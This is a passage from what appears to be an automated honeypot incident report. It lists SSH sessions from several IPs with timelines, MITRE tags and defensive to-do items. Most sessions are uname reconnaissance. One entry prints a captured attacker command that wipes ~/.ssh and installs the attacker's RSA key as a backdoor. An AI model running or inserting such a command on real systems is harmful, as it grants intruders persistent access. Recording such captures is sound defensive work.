- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df4487a07a7d

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-26 22:14 |
| **Last Seen** | 2026-07-26 22:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:14:53` | `cowrie.session.connect` |
| `2026-07-26 22:14:53` | `cowrie.client.version` |
| `2026-07-26 22:14:53` | `cowrie.client.kex` |
| `2026-07-26 22:14:53` | `cowrie.login.success` |
| `2026-07-26 22:14:54` | `cowrie.session.params` |
| `2026-07-26 22:14:54` | `cowrie.command.input` |
| `2026-07-26 22:14:54` | `cowrie.log.closed` |
| `2026-07-26 22:14:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a9a2d7cbb8d

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-26 22:16 |
| **Last Seen** | 2026-07-26 22:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:16:47` | `cowrie.session.connect` |
| `2026-07-26 22:16:47` | `cowrie.client.version` |
| `2026-07-26 22:16:47` | `cowrie.client.kex` |
| `2026-07-26 22:16:48` | `cowrie.login.success` |
| `2026-07-26 22:16:48` | `cowrie.session.params` |
| `2026-07-26 22:16:48` | `cowrie.command.input` |
| `2026-07-26 22:16:49` | `cowrie.log.closed` |
| `2026-07-26 22:16:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30c3baf3f3ef

| Field | Detail |
|---|---|
| **Source IP** | `189.56.0[.]19` |
| **First Seen** | 2026-07-26 22:17 |
| **Last Seen** | 2026-07-26 22:17 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:17:22` | `cowrie.session.connect` |
| `2026-07-26 22:17:23` | `cowrie.client.version` |
| `2026-07-26 22:17:23` | `cowrie.client.kex` |
| `2026-07-26 22:17:25` | `cowrie.login.success` |
| `2026-07-26 22:17:26` | `cowrie.direct-tcpip.request` |
| `2026-07-26 22:17:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.56.0[.]19` to AbuseIPDB if not already reported
- [ ] Block `189.56.0[.]19` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5d8363e85ef

| Field | Detail |
|---|---|
| **Source IP** | `119.200.229[.]33` |
| **First Seen** | 2026-07-26 22:17 |
| **Last Seen** | 2026-07-26 22:17 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:17:31` | `cowrie.session.connect` |
| `2026-07-26 22:17:32` | `cowrie.client.version` |
| `2026-07-26 22:17:32` | `cowrie.client.kex` |
| `2026-07-26 22:17:34` | `cowrie.login.success` |
| `2026-07-26 22:17:34` | `cowrie.direct-tcpip.request` |
| `2026-07-26 22:17:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.200.229[.]33` to AbuseIPDB if not already reported
- [ ] Block `119.200.229[.]33` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc6a905c58c6

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-26 22:18 |
| **Last Seen** | 2026-07-26 22:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:18:45` | `cowrie.session.connect` |
| `2026-07-26 22:18:45` | `cowrie.client.version` |
| `2026-07-26 22:18:45` | `cowrie.client.kex` |
| `2026-07-26 22:18:46` | `cowrie.login.success` |
| `2026-07-26 22:18:46` | `cowrie.session.params` |
| `2026-07-26 22:18:46` | `cowrie.command.input` |
| `2026-07-26 22:18:46` | `cowrie.log.closed` |
| `2026-07-26 22:18:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-401eb793cb0f

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-26 22:20 |
| **Last Seen** | 2026-07-26 22:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:20:42` | `cowrie.session.connect` |
| `2026-07-26 22:20:42` | `cowrie.client.version` |
| `2026-07-26 22:20:42` | `cowrie.client.kex` |
| `2026-07-26 22:20:42` | `cowrie.login.success` |
| `2026-07-26 22:20:43` | `cowrie.session.params` |
| `2026-07-26 22:20:43` | `cowrie.command.input` |
| `2026-07-26 22:20:43` | `cowrie.log.closed` |
| `2026-07-26 22:20:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e4a16d05209

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-26 22:21 |
| **Last Seen** | 2026-07-26 22:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:21:49` | `cowrie.session.connect` |
| `2026-07-26 22:21:49` | `cowrie.client.version` |
| `2026-07-26 22:21:49` | `cowrie.client.kex` |
| `2026-07-26 22:21:50` | `cowrie.login.success` |
| `2026-07-26 22:21:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2d5f7c7776c

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-26 22:21 |
| **Last Seen** | 2026-07-26 22:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:21:50` | `cowrie.session.connect` |
| `2026-07-26 22:21:50` | `cowrie.client.version` |
| `2026-07-26 22:21:50` | `cowrie.client.kex` |
| `2026-07-26 22:21:50` | `cowrie.login.success` |
| `2026-07-26 22:21:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e409d6425bb7

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-26 22:21 |
| **Last Seen** | 2026-07-26 22:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:21:50` | `cowrie.session.connect` |
| `2026-07-26 22:21:50` | `cowrie.client.version` |
| `2026-07-26 22:21:50` | `cowrie.client.kex` |
| `2026-07-26 22:21:50` | `cowrie.login.success` |
| `2026-07-26 22:21:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad8a486b2035

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-26 22:21 |
| **Last Seen** | 2026-07-26 22:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:21:50` | `cowrie.session.connect` |
| `2026-07-26 22:21:50` | `cowrie.client.version` |
| `2026-07-26 22:21:50` | `cowrie.client.kex` |
| `2026-07-26 22:21:50` | `cowrie.login.success` |
| `2026-07-26 22:21:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-deb5f1a8bda3

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-26 22:22 |
| **Last Seen** | 2026-07-26 22:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:22:29` | `cowrie.session.connect` |
| `2026-07-26 22:22:29` | `cowrie.client.version` |
| `2026-07-26 22:22:29` | `cowrie.client.kex` |
| `2026-07-26 22:22:30` | `cowrie.login.success` |
| `2026-07-26 22:22:31` | `cowrie.session.params` |
| `2026-07-26 22:22:31` | `cowrie.command.input` |
| `2026-07-26 22:22:31` | `cowrie.log.closed` |
| `2026-07-26 22:22:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70fc11e5e3ca

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-26 22:24 |
| **Last Seen** | 2026-07-26 22:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:24:20` | `cowrie.session.connect` |
| `2026-07-26 22:24:20` | `cowrie.client.version` |
| `2026-07-26 22:24:20` | `cowrie.client.kex` |
| `2026-07-26 22:24:20` | `cowrie.login.success` |
| `2026-07-26 22:24:21` | `cowrie.session.params` |
| `2026-07-26 22:24:21` | `cowrie.command.input` |
| `2026-07-26 22:24:21` | `cowrie.log.closed` |
| `2026-07-26 22:24:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6dbb68c3b88

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-26 22:26 |
| **Last Seen** | 2026-07-26 22:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:26:15` | `cowrie.session.connect` |
| `2026-07-26 22:26:15` | `cowrie.client.version` |
| `2026-07-26 22:26:15` | `cowrie.client.kex` |
| `2026-07-26 22:26:16` | `cowrie.login.success` |
| `2026-07-26 22:26:16` | `cowrie.session.params` |
| `2026-07-26 22:26:16` | `cowrie.command.input` |
| `2026-07-26 22:26:17` | `cowrie.log.closed` |
| `2026-07-26 22:26:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0526071c6e29

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-26 22:28 |
| **Last Seen** | 2026-07-26 22:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:28:07` | `cowrie.session.connect` |
| `2026-07-26 22:28:07` | `cowrie.client.version` |
| `2026-07-26 22:28:07` | `cowrie.client.kex` |
| `2026-07-26 22:28:07` | `cowrie.login.success` |
| `2026-07-26 22:28:08` | `cowrie.session.params` |
| `2026-07-26 22:28:08` | `cowrie.command.input` |
| `2026-07-26 22:28:08` | `cowrie.log.closed` |
| `2026-07-26 22:28:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62a6d7b5a82c

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-26 22:29 |
| **Last Seen** | 2026-07-26 22:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:29:59` | `cowrie.session.connect` |
| `2026-07-26 22:29:59` | `cowrie.client.version` |
| `2026-07-26 22:29:59` | `cowrie.client.kex` |
| `2026-07-26 22:30:00` | `cowrie.login.success` |
| `2026-07-26 22:30:00` | `cowrie.session.params` |
| `2026-07-26 22:30:00` | `cowrie.command.input` |
| `2026-07-26 22:30:01` | `cowrie.log.closed` |
| `2026-07-26 22:30:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-644cdb27ed34

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-26 22:31 |
| **Last Seen** | 2026-07-26 22:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:31:59` | `cowrie.session.connect` |
| `2026-07-26 22:31:59` | `cowrie.client.version` |
| `2026-07-26 22:31:59` | `cowrie.client.kex` |
| `2026-07-26 22:31:59` | `cowrie.login.success` |
| `2026-07-26 22:32:00` | `cowrie.session.params` |
| `2026-07-26 22:32:00` | `cowrie.command.input` |
| `2026-07-26 22:32:00` | `cowrie.log.closed` |
| `2026-07-26 22:32:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56583ca95a61

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]158` |
| **First Seen** | 2026-07-26 22:33 |
| **Last Seen** | 2026-07-26 22:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST, /bin/busybox TEST, cat /proc, ./` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:33:10` | `cowrie.session.connect` |
| `2026-07-26 22:33:11` | `cowrie.login.success` |
| `2026-07-26 22:33:11` | `cowrie.session.params` |
| `2026-07-26 22:33:12` | `cowrie.command.input` |
| `2026-07-26 22:33:12` | `cowrie.command.input` |
| `2026-07-26 22:33:13` | `cowrie.command.input` |
| `2026-07-26 22:33:14` | `cowrie.command.input` |
| `2026-07-26 22:33:14` | `cowrie.command.failed` |
| `2026-07-26 22:33:14` | `cowrie.log.closed` |
| `2026-07-26 22:33:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]158` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]158` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-057444282578

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-26 22:33 |
| **Last Seen** | 2026-07-26 22:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:33:42` | `cowrie.session.connect` |
| `2026-07-26 22:33:42` | `cowrie.client.version` |
| `2026-07-26 22:33:43` | `cowrie.client.kex` |
| `2026-07-26 22:33:43` | `cowrie.login.success` |
| `2026-07-26 22:33:44` | `cowrie.session.params` |
| `2026-07-26 22:33:44` | `cowrie.command.input` |
| `2026-07-26 22:33:44` | `cowrie.log.closed` |
| `2026-07-26 22:33:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5a871581fb5

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-26 22:35 |
| **Last Seen** | 2026-07-26 22:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:35:18` | `cowrie.session.connect` |
| `2026-07-26 22:35:18` | `cowrie.client.version` |
| `2026-07-26 22:35:18` | `cowrie.client.kex` |
| `2026-07-26 22:35:18` | `cowrie.login.success` |
| `2026-07-26 22:35:19` | `cowrie.session.params` |
| `2026-07-26 22:35:19` | `cowrie.command.input` |
| `2026-07-26 22:35:19` | `cowrie.log.closed` |
| `2026-07-26 22:35:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-290fdf529414

| Field | Detail |
|---|---|
| **Source IP** | `4.206.92[.]183` |
| **First Seen** | 2026-07-26 22:36 |
| **Last Seen** | 2026-07-26 22:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:36:34` | `cowrie.session.connect` |
| `2026-07-26 22:36:34` | `cowrie.client.version` |
| `2026-07-26 22:36:34` | `cowrie.client.kex` |
| `2026-07-26 22:36:34` | `cowrie.login.success` |
| `2026-07-26 22:36:34` | `cowrie.session.params` |
| `2026-07-26 22:36:34` | `cowrie.command.input` |
| `2026-07-26 22:36:34` | `cowrie.command.failed` |
| `2026-07-26 22:36:34` | `cowrie.log.closed` |
| `2026-07-26 22:36:35` | `cowrie.session.params` |
| `2026-07-26 22:36:35` | `cowrie.command.input` |
| `2026-07-26 22:36:35` | `cowrie.session.file_download` |
| `2026-07-26 22:36:35` | `cowrie.log.closed` |
| `2026-07-26 22:36:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.206.92[.]183` to AbuseIPDB if not already reported
- [ ] Block `4.206.92[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-917cdf8061d1

| Field | Detail |
|---|---|
| **Source IP** | `4.206.92[.]183` |
| **First Seen** | 2026-07-26 22:36 |
| **Last Seen** | 2026-07-26 22:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:36:35` | `cowrie.session.connect` |
| `2026-07-26 22:36:35` | `cowrie.client.version` |
| `2026-07-26 22:36:35` | `cowrie.client.kex` |
| `2026-07-26 22:36:35` | `cowrie.login.success` |
| `2026-07-26 22:36:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.206.92[.]183` to AbuseIPDB if not already reported
- [ ] Block `4.206.92[.]183` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b0bf71b49a6

| Field | Detail |
|---|---|
| **Source IP** | `4.206.92[.]183` |
| **First Seen** | 2026-07-26 22:36 |
| **Last Seen** | 2026-07-26 22:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:36:35` | `cowrie.session.connect` |
| `2026-07-26 22:36:35` | `cowrie.client.version` |
| `2026-07-26 22:36:35` | `cowrie.client.kex` |
| `2026-07-26 22:36:35` | `cowrie.login.success` |
| `2026-07-26 22:36:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.206.92[.]183` to AbuseIPDB if not already reported
- [ ] Block `4.206.92[.]183` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f138d5a249e6

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-26 22:36 |
| **Last Seen** | 2026-07-26 22:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:36:52` | `cowrie.session.connect` |
| `2026-07-26 22:36:52` | `cowrie.client.version` |
| `2026-07-26 22:36:52` | `cowrie.client.kex` |
| `2026-07-26 22:36:53` | `cowrie.login.success` |
| `2026-07-26 22:36:54` | `cowrie.session.params` |
| `2026-07-26 22:36:54` | `cowrie.command.input` |
| `2026-07-26 22:36:54` | `cowrie.log.closed` |
| `2026-07-26 22:36:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51103a011bdd

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-26 22:38 |
| **Last Seen** | 2026-07-26 22:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:38:32` | `cowrie.session.connect` |
| `2026-07-26 22:38:32` | `cowrie.client.version` |
| `2026-07-26 22:38:32` | `cowrie.client.kex` |
| `2026-07-26 22:38:33` | `cowrie.login.success` |
| `2026-07-26 22:38:34` | `cowrie.session.params` |
| `2026-07-26 22:38:34` | `cowrie.command.input` |
| `2026-07-26 22:38:34` | `cowrie.log.closed` |
| `2026-07-26 22:38:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ffa864b1763

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-26 22:40 |
| **Last Seen** | 2026-07-26 22:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:40:06` | `cowrie.session.connect` |
| `2026-07-26 22:40:06` | `cowrie.client.version` |
| `2026-07-26 22:40:06` | `cowrie.client.kex` |
| `2026-07-26 22:40:06` | `cowrie.login.success` |
| `2026-07-26 22:40:07` | `cowrie.session.params` |
| `2026-07-26 22:40:07` | `cowrie.command.input` |
| `2026-07-26 22:40:07` | `cowrie.log.closed` |
| `2026-07-26 22:40:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa867d8b9dc1

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-26 22:41 |
| **Last Seen** | 2026-07-26 22:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 22:41:40` | `cowrie.session.connect` |
